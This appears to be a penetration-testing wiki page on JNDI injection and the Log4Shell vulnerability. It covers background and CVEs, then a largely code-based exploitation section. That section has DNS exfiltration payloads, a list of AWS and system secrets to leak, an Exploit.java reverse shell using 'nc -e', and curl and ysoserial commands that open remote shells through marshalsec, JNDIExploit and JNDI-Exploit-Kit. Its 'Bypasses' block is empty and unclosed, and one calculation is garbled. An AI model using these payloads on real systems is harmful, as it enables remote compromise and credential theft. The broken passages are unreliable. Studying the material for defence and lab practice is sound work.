  ## Basic Information\n\nJNDI, integrated into Java since the late 1990s, serves as a directory service, enabling Java programs\
  \ to locate data or objects through a naming system. It supports various directory services via service provider interfaces\
  \ (SPIs), allowing data retrieval from different systems, including remote Java objects. Common SPIs include CORBA COS,\
  \ Java RMI Registry, and LDAP.\n\n### JNDI Naming Reference\n\nJava objects can be stored and retrieved using JNDI Naming\
  \ References, which come in two forms:\n\n- **Reference Addresses**: Specifies an object's location (e.g., _rmi://server/ref_),\
  \ allowing direct retrieval from the specified address.\n- **Remote Factory**: References a remote factory class. When accessed,\
  \ the class is downloaded and instantiated from the remote location.\n\nHowever, this mechanism can be exploited, potentially\
  \ leading to the loading and execution of arbitrary code. As a countermeasure:\n\n- **RMI**: `java.rmi.server.useCodeabseOnly\
  \ = true` by default from JDK 7u21, restricting remote object loading. A Security Manager further limits what can be loaded.\n\
  - **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` by default from JDK 6u141, 7u131, 8u121, blocking the execution\
  \ of remotely loaded Java objects. If set to `true`, remote code execution is possible without a Security Manager's oversight.\n\
  - **CORBA**: Doesn't have a specific property, but the Security Manager is always active.\n\nHowever, the **Naming Manager**,\
  \ responsible for resolving JNDI links, lacks built-in security mechanisms, potentially allowing the retrieval of objects\
  \ from any source. This poses a risk as RMI, LDAP, and CORBA protections can be circumvented, leading to the loading of\
  \ arbitrary Java objects or exploiting existing application components (gadgets) to run malicious code.\n\nExamples of exploitable\
  \ URLs include:\n\n- _rmi://attacker-server/bar_\n- _ldap://attacker-server/bar_\n- _iiop://attacker-server/bar_\n\nDespite\
  \ protections, vulnerabilities remain, mainly due to the lack of safeguards against loading JNDI from untrusted sources\
  \ and the possibility of bypassing existing protections.\n\n### JNDI Example\n\n![](<../../images/image (1022).png>)\n\n\
  Even if you have set a **`PROVIDER_URL`**, you can indicate a different one in a lookup and it will be accessed: `ctx.lookup(\"\
  <attacker-controlled-url>\")` and that is what an attacker will abuse to load arbitrary objects from a system controlled\
  \ by him.\n\n### CORBA Overview\n\nCORBA (Common Object Request Broker Architecture) employs an **Interoperable Object Reference\
  \ (IOR)** to uniquely identify remote objects. This reference includes essential information like:\n\n- **Type ID**: Unique\
  \ identifier for an interface.\n- **Codebase**: URL for obtaining the stub class.\n\nNotably, CORBA isn't inherently vulnerable.\
  \ Ensuring security typically involves:\n\n- Installation of a **Security Manager**.\n- Configuring the Security Manager\
  \ to permit connections to potentially malicious codebases. This can be achieved through:\n  - Socket permission, e.g.,\
  \ `permissions java.net.SocketPermission \"*:1098-1099\", \"connect\";`.\n  - File read permissions, either universally\
  \ (`permission java.io.FilePermission \"<<ALL FILES>>\", \"read\";`) or for specific directories where malicious files might\
  \ be placed.\n\nHowever, some vendor policies might be lenient and allow these connections by default.\n\n### RMI Context\n\
  \nFor RMI (Remote Method Invocation), the situation is somewhat different. As with CORBA, arbitrary class downloading is\
  \ restricted by default. To exploit RMI, one would typically need to circumvent the Security Manager, a feat also relevant\
  \ in CORBA.\n\n### LDAP\n\nFirst of all, wee need to distinguish between a Search and a Lookup.\\\nA **search** will use\
  \ an URL like `ldap://localhost:389/o=JNDITutorial` to find the JNDITutorial object from an LDAP server and **retreive its\
  \ attributes**.\\\nA **lookup** is meant for **naming services** as we want to get **whatever is bound to a name**.\n\n\
  If the LDAP search was invoked with **SearchControls.setReturningObjFlag() with `true`, then the returned object will be\
  \ reconstructed**.\n\nTherefore, there are several ways to attack these options.\\\nAn **attacker may poison LDAP records\
  \ introducing payloads** on them that will be executed in the systems that gather them (very useful to **compromise tens\
  \ of machines** if you have access to the LDAP server). Another way to exploit this would be to perform a **MitM attack\
  \ in a LDAP searc**h for example.\n\nIn case you can **make an app resolve a JNDI LDAP UR**L, you can control the LDAP that\
  \ will be searched, and you could send back the exploit (log4shell).\n\n#### Deserialization exploit\n\n![](<../../images/image\
  \ (275).png>)\n\nThe **exploit is serialized** and will be deserialized.\\\nIn case `trustURLCodebase` is `true`, an attacker\
  \ can provide his own classes in the codebase if not, he will need to abuse gadgets in the classpath.\n\n#### JNDI Reference\
  \ exploit\n\nIt's easier to attack this LDAP using **JavaFactory references**:\n\n![](<../../images/image (1059).png>)\n\
  \n## Log4Shell Vulnerability\n\nThe vulnerability is introduced in Log4j because it supports a [**special syntax**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution)\
  \ in the form `${prefix:name}` where `prefix` is one of a number of different [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html)\
  \ where `name` should be evaluated. For example, `${java:version}` is the current running version of Java.\n\n[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313)\
  \ introduced a `jndi` Lookup feature. This feature enables the retrieval of variables through JNDI. Typically, the key is\
  \ automatically prefixed with `java:comp/env/`. However, if the key itself includes a **\":\"**, this default prefix is\
  \ not applied.\n\nWith a **: present** in the key, as in `${jndi:ldap://example.com/a}` there’s **no prefix** and the **LDAP\
  \ server is queried for the object**. And these Lookups can be used in both the configuration of Log4j as well as when lines\
  \ are logged.\n\nTherefore, the only thing needed to get RCE a **vulnerable version of Log4j processing information controlled\
  \ by the user**. And because this is a library widely used by Java applications to log information (Internet facing applications\
  \ included) it was very common to have log4j logging for example HTTP headers received like the User-Agent. However, log4j\
  \ is **not used to log only HTTP information but any input** and data the developer indicated.\n\n## Overview of Log4Shell-Related\
  \ CVEs\n\n### [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\\[Critical]**\n\nThis vulnerability is\
  \ a critical **untrusted deserialization flaw** in the `log4j-core` component, affecting versions from 2.0-beta9 to 2.14.1.\
  \ It allows **remote code execution (RCE)**, enabling attackers to take over systems. The issue was reported by Chen Zhaojun\
  \ from Alibaba Cloud Security Team and affects various Apache frameworks. The initial fix in version 2.15.0 was incomplete.\
  \ Sigma rules for defense are available ([Rule 1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j_fields.yml),\
  \ [Rule 2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web_cve_2021_44228_log4j.yml)).\n\n### [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/CVE-2021-45046)\
  \ **\\[Critical]**\n\nInitially rated low but later upgraded to critical, this CVE is a **Denial of Service (DoS)** flaw\
  \ resulting from an incomplete fix in 2.15.0 for CVE-2021-44228. It affects non-default configurations, allowing attackers\
  \ to cause DoS attacks through crafted payloads. A [tweet](https://twitter.com/marcioalm/status/1471740771581652995) showcases\
  \ a bypass method. The issue is resolved in versions 2.16.0 and 2.12.2 by removing message lookup patterns and disabling\
  \ JNDI by default.\n\n### [CVE-2021-4104](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\\[High]**\n\nAffecting **Log4j\
  \ 1.x versions** in non-default configurations using `JMSAppender`, this CVE is an untrusted deserialization flaw. No fix\
  \ is available for the 1.x branch, which is end-of-life, and upgrading to `log4j-core 2.17.0` is recommended.\n\n### [CVE-2021-42550](https://nvd.nist.gov/vuln/detail/CVE-2021-42550)\
  \ **\\[Moderate]**\n\nThis vulnerability affects the **Logback logging framework**, a successor to Log4j 1.x. Previously\
  \ thought to be safe, the framework was found vulnerable, and newer versions (1.3.0-alpha11 and 1.2.9) have been released\
  \ to address the issue.\n\n### **CVE-2021-45105** **\\[High]**\n\nLog4j 2.16.0 contains a DoS flaw, prompting the release\
  \ of `log4j 2.17.0` to fix the CVE. Further details are in BleepingComputer's [report](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/).\n\
  \n### [CVE-2021-44832](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/)\n\
  \nAffecting log4j version 2.17, this CVE requires the attacker to control the configuration file of log4j. It involves potential\
  \ arbitrary code execution via a configured JDBCAppender. More details are available in the [Checkmarx blog post](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).\n\
  \n## Log4Shell Exploitation\n\n### Discovery\n\nThis vulnerability is very easy to discover if unprotected because it will\
  \ send at least a **DNS request** to the address you indicate in your payload. Therefore, payloads like:\n\n- `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}`\
  \ (using [canarytokens.com](https://canarytokens.org/generate))\n- `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}`\
  \ (using [interactsh](https://github.com/projectdiscovery/interactsh))\n- `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}`\
  \ (using Burp Suite)\n- `${jndi:ldap://2j4ayo.dnslog.cn}` (using [dnslog](http://dnslog.cn))\n- `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}`\
  \ using (using [huntress](https://log4shell.huntress.com))\n\nNote that **even if a DNS request is received that doesn't\
  \ mean the application is exploitable** (or even vulnerable), you will need to try to exploit it.\n\n> [!TIP]\n> Remember\
  \ that to **exploit version 2.15** you need to add the **localhost check bypass**: ${jndi:ldap://**127.0.0.1#**...}\n\n\
  #### **Local Discovery**\n\nSearch for **local vulnerable versions** of the library with:\n\n```bash\nfind / -name \"log4j-core*.jar\"\
  \ 2>/dev/null | grep -E \"log4j\\-core\\-(1\\.[^0]|2\\.[0-9][^0-9]|2\\.1[0-6])\"\n```\n\n### **Verification**\n\nSome of\
  \ the platforms listed before will allow you to insert some variable data that will be logged when it’s requested.\\\nThis\
  \ can be very useful for 2 things:\n\n- To **verify** the vulnerability\n- To **exfiltrate information** abusing the vulnerability\n\
  \nFor example you could request something like:\\\nor like `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`**\
  \ and if a **DNS request is received with the value of the env variable**, you know the application is vulnerable.\n\nOther\
  \ information you could try to **leak**:\n\n```\n${env:AWS_ACCESS_KEY_ID}\n${env:AWS_CONFIG_FILE}\n${env:AWS_PROFILE}\n\
  ${env:AWS_SECRET_ACCESS_KEY}\n${env:AWS_SESSION_TOKEN}\n${env:AWS_SHARED_CREDENTIALS_FILE}\n${env:AWS_WEB_IDENTITY_TOKEN_FILE}\n\
  ${env:HOSTNAME}\n${env:JAVA_VERSION}\n${env:PATH}\n${env:USER}\n${hostName}\n${java.vendor}\n${java:os}\n${java:version}\n\
  ${log4j:configParentLocation}\n${sys:PROJECT_HOME}\n${sys:file.separator}\n${sys:java.class.path}\n${sys:java.class.path}\n\
  ${sys:java.class.version}\n${sys:java.compiler}\n${sys:java.ext.dirs}\n${sys:java.home}\n${sys:java.io.tmpdir}\n${sys:java.library.path}\n\
  ${sys:java.specification.name}\n${sys:java.specification.vendor}\n${sys:java.specification.version}\n${sys:java.vendor.url}\n\
  ${sys:java.vendor}\n${sys:java.version}\n${sys:java.vm.name}\n${sys:java.vm.specification.name}\n${sys:java.vm.specification.vendor}\n\
  ${sys:java.vm.specification.version}\n${sys:java.vm.vendor}\n${sys:java.vm.version}\n${sys:line.separator}\n${sys:os.arch}\n\
  ${sys:os.name}\n${sys:os.version}\n${sys:path.separator}\n${sys:user.dir}\n${sys:user.home}\n${sys:user.name}\n\nAny other\
  \ env variable name that could store sensitive information\n```\n\n### RCE Information\n\n> [!TIP]\n> Hosts running on JDK\
  \ versions above 6u141, 7u131, or 8u121 are safeguarded against the LDAP class loading attack vector. This is due to the\
  \ default deactivation of `com.sun.jndi.ldap.object.trustURLCodebase`, which prevents JNDI from loading a remote codebase\
  \ via LDAP. However, it's crucial to note that these versions are **not protected against the deserialization attack vector**.\n\
  >\n> For attackers aiming to exploit these higher JDK versions, it's necessary to leverage a **trusted gadget** within the\
  \ Java application. Tools like ysoserial or JNDIExploit are often used for this purpose. On the contrary, exploiting lower\
  \ JDK versions is relatively easier as these versions can be manipulated to load and execute arbitrary classes.\n>\n> For\
  \ **more information** (_like limitations on RMI and CORBA vectors_) **check the previous JNDI Naming Reference section**\
  \ or [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)\n\
  \n### RCE - Marshalsec with custom payload\n\nYou can test this in the **THM box:** [**https://tryhackme.com/room/solar**](https://tryhackme.com/room/solar)\n\
  \nUse the tool [**marshalsec**](https://github.com/mbechler/marshalsec) (jar version available [**here**](https://github.com/RandomRobbieBF/marshalsec-jar)).\
  \ This approach establishes a LDAP referral server to redirect connections to a secondary HTTP server where the exploit\
  \ will be hosted:\n\n```bash\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://<your_ip_http_server>:8000/#Exploit\"\
  \n```\n\nTo prompt the target to load a reverse shell code, craft a Java file named `Exploit.java` with the content below:\n\
  \n```java\npublic class Exploit {\n    static {\n        try {\n            java.lang.Runtime.getRuntime().exec(\"nc -e\
  \ /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999\");\n        } catch (Exception e) {\n            e.printStackTrace();\n     \
  \   }\n    }\n}\n```\n\nCompile the Java file into a class file using: `javac Exploit.java -source 8 -target 8`. Next, initiate\
  \ a **HTTP server** in the directory containing the class file with: `python3 -m http.server`. Ensure the **marshalsec LDAP\
  \ server** references this HTTP server.\n\nTrigger the execution of the exploit class on the susceptible web server by dispatching\
  \ a payload resembling:\n\n```bash\n${jndi:ldap://<LDAP_IP>:1389/Exploit}\n```\n\n**Note:** This exploit hinges on Java's\
  \ configuration to permit remote codebase loading via LDAP. If this is not permissible, consider exploiting a trusted class\
  \ for arbitrary code execution.\n\n### RCE - **JNDIExploit**\n\n> [!TIP]\n> Note that for some reason the author removed\
  \ this project from github after the discovery of log4shell. You can find a cached version in [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2)\
  \ but if you want to respect the decision of the author use a different method to exploit this vuln.\n>\n> Moreover, you\
  \ cannot find the source code in wayback machine, so either analyse the source code, or execute the jar knowing that you\
  \ don't know what you are executing.\n\nFor this example you can just run this **vulnerable web server to log4shell** in\
  \ port 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)\
  \ (_in the README you will find how to run it_). This vulnerable app is logging with a vulnerable version of log4shell the\
  \ content of the HTTP request header _X-Api-Version_.\n\nThen, you can download the **JNDIExploit** jar file and execute\
  \ it with:\n\n```bash\nwget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip\n\
  unzip JNDIExploit.v1.2.zip\njava -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and\
  \ a port where the victim will be able to access\n```\n\nAfter reading the code just a couple of minutes, in _com.feihong.ldap.LdapServer_\
  \ and _com.feihong.ldap.HTTPServer_ you can see how the **LDAP and HTTP servers are created**. The LDAP server will understand\
  \ what payload need to be served and will redirect the victim to the HTTP server, which will serve the exploit.\\\nIn _com.feihong.ldap.gadgets_\
  \ you can find **some specific gadgets** that can be used to excute the desired action (potentially execute arbitrary code).\
  \ And in _com.feihong.ldap.template_ you can see the different template classes that will **generate the exploits**.\n\n\
  You can see all the available exploits with **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Some useful ones are:\n\n```bash\n\
  ldap://null:1389/Basic/Dnslog/[domain]\nldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]\nldap://null:1389/Basic/ReverseShell/[ip]/[port]\n\
  # But there are a lot more\n```\n\nSo, in our example, we already have that docker vulnerable app running. To attack it:\n\
  \n```bash\n# Create a file inside of th vulnerable host:\ncurl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'\n\
  \n# Get a reverse shell (only unix)\ncurl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'\n\
  curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'\n\
  ```\n\nWhen sending the attacks you will see some output in the terminal where you executed **JNDIExploit-1.2-SNAPSHOT.jar**.\n\
  \n**Remember to check `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` for other exploitation options. Moreover, in case you\
  \ need it, you can change the port of the LDAP and HTTP servers.**\n\n### RCE - JNDI-Exploit-Kit <a href=\"#rce__jndiexploitkit_33\"\
  \ id=\"rce__jndiexploitkit_33\"></a>\n\nIn a similar way to the previous exploit, you can try to use [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit)\
  \ to exploit this vulnerability.\\\nYou can generate the URLs to send to the victim running:\n\n```bash\n# Get reverse shell\
  \ in port 4444 (only unix)\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888\
  \ -S 172.17.0.1:4444\n\n# Execute command\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888\
  \ -C \"touch /tmp/log4shell\"\n```\n\n_This attack using a custom generated java object will work in labs like the **THM\
  \ solar room**. However, this won’t generally work (as by default Java is not configured to load remote codebase using LDAP)\
  \ I think because it’s not abusing a trusted class to execute arbitrary code._\n\n### RCE - JNDI-Injection-Exploit-Plus\n\
  \n[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus)\
  \ is another tool for generating **workable JNDI links** and provide background services by starting RMI server,LDAP server\
  \ and HTTP server.\\\n\n### RCE - ysoserial & JNDI-Exploit-Kit\n\nThis option is really useful to attack **Java versions\
  \ configured to only trust specified classes and not everyone**. Therefore, **ysoserial** will be used to generate **serializations\
  \ of trusted classes** that can be used as gadgets to **execute arbitrary code** (_the trusted class abused by ysoserial\
  \ must be used by the victim java program in order for the exploit to work_).\n\nUsing **ysoserial** or [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified)\
  \ you can create the deserialization exploit that will be downloaded by JNDI:\n\n```bash\n# Rev shell via CommonsCollections5\n\
  java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser\n```\n\
  \nUse [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) to generate **JNDI links** where the exploit will\
  \ be waiting for connections from the vulnerable machines. You can server **different exploit that can be automatically\
  \ generated** by the JNDI-Exploit-Kit or even your **own deserialization payloads** (generated by you or ysoserial).\n\n\
  ```bash\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser\n```\n\n![](<../../images/image\
  \ (1118).png>)\n\nNow you can easily use a generated JNDI link to exploit the vulnerability and obtain a **reverse shell**\
  \ just sending to a vulnerable version of log4j: **`${ldap://10.10.14.10:1389/generated}`**\n\n### Bypasses\n\n```java\n\

  \n## Post-Log4Shell Exploitation\n\nIn this [**CTF writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)\
  \ is well explained how it's potentially **possible** to **abuse** some features of **Log4J**.\n\nThe [**security page**](https://logging.apache.org/log4j/2.x/security.html)\
  \ of Log4j has some interesting sentences:\n\n> From version 2.16.0 (for Java 8), the **message lookups feature has been\
  \ completely removed**. **Lookups in configuration still work**. Furthermore, Log4j now disables access to JNDI by default.\
  \ JNDI lookups in configuration now need to be enabled explicitly.\n\n> From version 2.17.0, (and 2.12.3 and 2.3.1 for Java\
  \ 7 and Java 6), **only lookup strings in configuration are expanded recursively**; in any other usage, only the top-level\
  \ lookup is resolved, and any nested lookups are not resolved.\n\nThis means that by default you can **forget using any\
  \ `jndi` exploit**. Moreover, to perform **recursive lookups** you need to have them configure.\n\nFor example, in that\
  \ CTF this was configured in the file log4j2.xml:\n\n```xml\n<Console name=\"Console\" target=\"SYSTEM_ERR\">\n    <PatternLayout\
  \ pattern=\"%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n\">\n    </PatternLayout>\n</Console>\n\
  ```\n\n### Env Lookups\n\nIn [this CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) the attacker controlled\
  \ the value of `${sys:cmd}` and needed to exfiltrate the flag from an environment variable.\\\nAs seen in this page in [**previous\
  \ payloads**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) there are different some ways to access\
  \ env variables, such as: **`${env:FLAG}`**. In this CTF this was useless but it might not be in other real life scenarios.\n\
  \n### Exfiltration in Exceptions\n\nIn the CTF, you **couldn't access the stderr** of the java application using log4J,\
  \ but Log4J **exceptions are sent to stdout**, which was printed in the python app. This meant that triggering an exception\
  \ we could access the content. An exception to exfiltrate the flag was: **`${java:${env:FLAG}}`.** This works because **`${java:CTF{blahblah}}`**\
  \ doesn't exist and an exception with the value of the flag will be shown:\n\n![](<../../images/image (1023).png>)\n\n###\
  \ Conversion Patterns Exceptions\n\nJust to mention it, you could also inject new [**conversion patterns**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout)\
  \ and trigger exceptions that will be logged to `stdout`. For example:\n\n![](<../../images/image (683).png>)\n\nThis wasn't\
  \ found useful to exfiltrate date inside the error message, because the lookup wasn't solved before the conversion pattern,\
  \ but it could be useful for other stuff such as detecting.\n\n### Conversion Patterns Regexes\n\nHowever, it's possible\
  \ to use some **conversion patterns that supports regexes** to exfiltrate information from a lookup by using regexes and\
  \ abusing **binary search** or **time based** behaviours.\n\n- **Binary search via exception messages**\n\nThe conversion\
  \ pattern **`%replace`** can be use to **replace** **content** from a **string** even using **regexes**. It works like this:\
  \ `replace{pattern}{regex}{substitution}`\\\nAbusing this behaviour you could make replace **trigger an exception if the\
  \ regex matched** anything inside the string (and no exception if it wasn't found) like this:\n\n```bash\n%replace{${env:FLAG}}{^CTF.*}{${error}}\n\
  # The string searched is the env FLAG, the regex searched is ^CTF.*\n## and ONLY if it's found ${error} will be resolved\
  \ with will trigger an exception\n```\n\n- **Time based**\n\nAs it was mentioned in the previous section, **`%replace`**\
  \ supports **regexes**. So it's possible to use payload from the [**ReDoS page**](../regular-expression-denial-of-service-redos.md)\
  \ to cause a **timeout** in case the flag is found.\\\nFor example, a payload like `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}`\
  \ would trigger a **timeout** in that CTF.\n\nIn this [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/),\
  \ instead of using a ReDoS attack it used an **amplification attack** to cause a time difference in the response:\n\n> ```\n\
  > /%replace{\n> %replace{\n> %replace{\n> %replace{\n> %replace{\n> %replace{\n> %replace{${ENV:FLAG}}{CTF\\{\" + flagGuess\
  \ + \".*\\}}{#############################}\n> }{#}{######################################################}\n> }{#}{######################################################}\n\
  > }{#}{######################################################}\n> }{#}{######################################################}\n\
  > }{#}{######################################################}\n> }{#}{######################################################}\n\
  > }{#}{######################################################}\n> ```\n>\n> If the flag starts with `flagGuess`, the whole\
  \ flag is replaced with 29 `#`-s (I used this character because it would likely not be part of the flag). **Each of the\
  \ resulting 29 `#`-s is then replaced by 54 `#`-s**. This process is repeated **6 times**, leading to a total of ` 29*54*54^6*\
  \ =`` `` `**`96816014208`** **`#`-s!**\n>\n> Replacing so many `#`-s will trigger the 10-second timeout of the Flask application,\
  \ which in turn will result in the HTTP status code 500 being sent to the user. (If the flag does not start with `flagGuess`,\
  \ we will receive a non-500 status code)\n\n## References\n\n- [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)\n\
